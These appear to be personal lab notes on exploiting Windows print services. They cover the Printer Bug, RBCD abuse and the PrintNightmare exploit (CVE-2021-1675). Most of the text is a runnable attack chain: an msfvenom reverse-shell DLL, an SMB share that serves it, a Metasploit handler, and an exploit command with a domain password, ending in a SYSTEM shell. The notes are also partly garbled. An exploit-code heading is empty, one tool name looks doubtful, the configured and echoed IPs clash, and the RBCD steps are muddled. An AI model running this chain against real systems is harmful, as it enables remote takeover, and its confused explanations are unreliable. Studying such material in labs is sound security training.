


The **Printer Bug** is an NTLM relay vulnerability in Windows that exploits the **MS-RPRN (Remote Print System)** interface. It forces a computer to authenticate to another system via NTLM by tricking it into connecting to a fake printer share.

#### Key Steps in the Printer Bug Exploit:

1. An attacker tricks a target system into initiating an SMB connection to their controlled system (e.g., via `MS-RPRN`).
2. The target system sends an **NTLM authentication request**, which can then be relayed or captured for further use.

#### Example Exploit Code:

Using a tool like `impacket-rprnrelay` to trigger the Printer Bug:
### **Setting Up Resource-Based Constrained Delegation (RBCD)**

RBCD allows you to configure which accounts or computers can impersonate other users to access a resource. By combining RBCD with the Printer Bug, you can redirect delegation privileges from a legitimate computer to one you control.
- **Gain Write Access to the Target Resource's Delegation Attribute**:
    
    - Find a computer object in AD where you have control (e.g., through a compromised machine or account).
    - Modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the target computer to include your controlled computer object.
- **Abuse Printer Bug to Authenticate to the Target**:
    
    - Trigger the Printer Bug on the target computer to force it to authenticate to your controlled computer.
- **Relay Authentication**:
    
    - Relay the NTLM authentication from the target to your controlled computer.
    - At this point, your controlled computer has a Kerberos Service Ticket that allows it to impersonate users to the target computer.
Important blog 

`git clone https://github.com/cube0x0/CVE-2021-1675.git`
 For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We 
#### Install cube0x0's Version of Impacket

```shell-session
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.

```shell-session
$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
```

```shell-session
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```
serve meterpreter payload
```shell-session
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```
catching the reverse shell that gets executed on the target.
 Configuring & Starting MSF multi/handler:
```shell-session
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
```



`CReate a share`
```shell-session
$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

`Configuring & Starting MSF multi/handler`
```shell-session
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080 
```
```shell-session
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

`run exploit and point to revshell`
```shell-session
$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

`meterpreter:`
```shell-session
C:\Windows\system32>whoami
whoami
nt authority\system
```


## t